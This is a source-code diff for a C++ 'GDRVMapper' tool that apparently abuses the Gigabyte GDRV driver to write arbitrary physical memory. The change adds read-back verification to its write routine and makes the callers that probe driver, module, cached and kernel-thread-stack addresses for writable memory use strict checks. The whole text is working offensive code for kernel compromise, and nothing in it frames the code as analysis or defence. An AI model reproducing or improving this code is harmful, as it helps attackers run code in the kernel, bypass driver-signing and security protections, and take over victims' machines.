@@ -98,14 +98,31 @@ bool GDRVMapper::WritePhysicalMemory(uint64_t physAddress, const void* buffer, s
             NULL
         );
         
-        if (!strictValidation) {
-            // Just attempt the write and return without checking for errors
-            return true;
+        if (!result) {
+            if (strictValidation) {
+                std::cerr << "[-] Write failed with error: " << GetLastError() << std::endl;
+            }
+            continue;
         }
         
-        if (result) {
-            return true;
+        // Verify write by reading back
+        std::vector<uint8_t> readBuffer(size);
+        if (!ReadPhysicalMemory(physAddress, readBuffer.data(), size)) {
+            if (strictValidation) {
+                std::cerr << "[-] Failed to verify write - read failed" << std::endl;
+            }
+            continue;
         }
+        
+        // Compare written data
+        if (memcmp(buffer, readBuffer.data(), size) != 0) {
+            if (strictValidation) {
+                std::cerr << "[-] Write verification failed - data mismatch" << std::endl;
+            }
+            continue;
+        }
+        
+        return true;
     }
     return false;
 }
@@ -201,13 +218,13 @@ uint64_t GDRVMapper::FindGDRVWritableMemory() {
     
     std::vector<uint8_t> testPattern = { 0xDE, 0xAD, 0xBE, 0xEF };
     
-    // Try standard offsets first with non-strict validation
+    // Try standard offsets first with strict validation
     for (auto offset : offsets) {
         uint64_t tryAddr = gdrvBase + offset;
         std::cout << "[*] Trying GDRV memory at 0x" << std::hex << tryAddr << std::dec << std::endl;
         
-        if (WritePhysicalMemory(tryAddr, testPattern.data(), testPattern.size(), false)) {
-            std::cout << "[+] Found writable memory in GDRV at 0x" << std::hex << tryAddr << std::dec << std::endl;
+        if (WritePhysicalMemory(tryAddr, testPattern.data(), testPattern.size(), true)) {
+            std::cout << "[+] Found verified writable memory in GDRV at 0x" << std::hex << tryAddr << std::dec << std::endl;
             return tryAddr;
         }
     }
@@ -232,8 +249,8 @@ uint64_t GDRVMapper::FindGDRVWritableMemory() {
             std::cout << "[*] Scanning GDRV memory at 0x" << std::hex << tryAddr << std::dec << std::endl;
         }
         
-        if (WritePhysicalMemory(tryAddr, testPattern.data(), testPattern.size(), false)) {
-            std::cout << "[+] Found writable memory in GDRV at 0x" << std::hex << tryAddr << std::dec << std::endl;
+        if (WritePhysicalMemory(tryAddr, testPattern.data(), testPattern.size(), true)) {
+            std::cout << "[+] Found verified writable memory in GDRV at 0x" << std::hex << tryAddr << std::dec << std::endl;
             return tryAddr;
         }
     }
@@ -290,8 +307,8 @@ uint64_t GDRVMapper::FindModuleWritableMemory() {
                 std::cout << "[*] Scanning address 0x" << std::hex << tryAddr << std::dec << std::endl;
             }
             
-            if (WritePhysicalMemory(tryAddr, testPattern.data(), testPattern.size(), false)) {
-                std::cout << "[+] Found writable memory in " << path << " at 0x" << std::hex << tryAddr << std::dec << std::endl;
+            if (WritePhysicalMemory(tryAddr, testPattern.data(), testPattern.size(), true)) {
+                std::cout << "[+] Found verified writable memory in " << path << " at 0x" << std::hex << tryAddr << std::dec << std::endl;
                 return tryAddr;
             }
         }
@@ -302,14 +319,14 @@ uint64_t GDRVMapper::FindModuleWritableMemory() {
 }
 
 uint64_t GDRVMapper::TryWritableRegion(uint64_t startAddr) {
-    // Check cached address first
+    // Check cached address first with strict validation
     if (cachedWritableAddr != 0) {
         std::vector<uint8_t> testPattern = { 0xDE, 0xAD, 0xBE, 0xEF };
-        if (WritePhysicalMemory(cachedWritableAddr, testPattern.data(), testPattern.size(), false)) {
-            std::cout << "[+] Using cached writable memory at 0x" << std::hex << cachedWritableAddr << std::dec << std::endl;
+        if (WritePhysicalMemory(cachedWritableAddr, testPattern.data(), testPattern.size(), true)) {
+            std::cout << "[+] Using verified cached writable memory at 0x" << std::hex << cachedWritableAddr << std::dec << std::endl;
             return cachedWritableAddr;
         }
-        // Clear cache if no longer writable
+        std::cout << "[-] Cached address no longer writable, clearing cache" << std::endl;
         cachedWritableAddr = 0;
     }
 
@@ -340,8 +357,8 @@ uint64_t GDRVMapper::TryWritableRegion(uint64_t startAddr) {
             uint64_t tryAddr = startAddr + offset;
             std::cout << "[*] Probing address 0x" << std::hex << tryAddr << std::dec << std::endl;
             
-            if (WritePhysicalMemory(tryAddr, testPattern.data(), testPattern.size(), false)) {
-                std::cout << "[+] Found writable memory at 0x" << std::hex << tryAddr << std::dec << std::endl;
+            if (WritePhysicalMemory(tryAddr, testPattern.data(), testPattern.size(), true)) {
+                std::cout << "[+] Found verified writable memory at 0x" << std::hex << tryAddr << std::dec << std::endl;
                 cachedWritableAddr = tryAddr;
                 return tryAddr;
             }
@@ -478,10 +495,10 @@ uint64_t GDRVMapper::FindKThreadStackMemory() {
         
         std::cout << "[*] Probing stack at 0x" << std::hex << probeAddr << std::dec << std::endl;
         
-        // Try to write test pattern
+        // Try to write test pattern with strict validation
         std::vector<uint8_t> testPattern = { 0xDE, 0xAD, 0xBE, 0xEF };
-        if (WritePhysicalMemory(probeAddr, testPattern.data(), testPattern.size())) {
-            std::cout << "[+] Found writable stack memory at 0x" << std::hex << probeAddr << std::dec << std::endl;
+        if (WritePhysicalMemory(probeAddr, testPattern.data(), testPattern.size(), true)) {
+            std::cout << "[+] Found verified writable stack memory at 0x" << std::hex << probeAddr << std::dec << std::endl;
             return probeAddr;
         }
     }
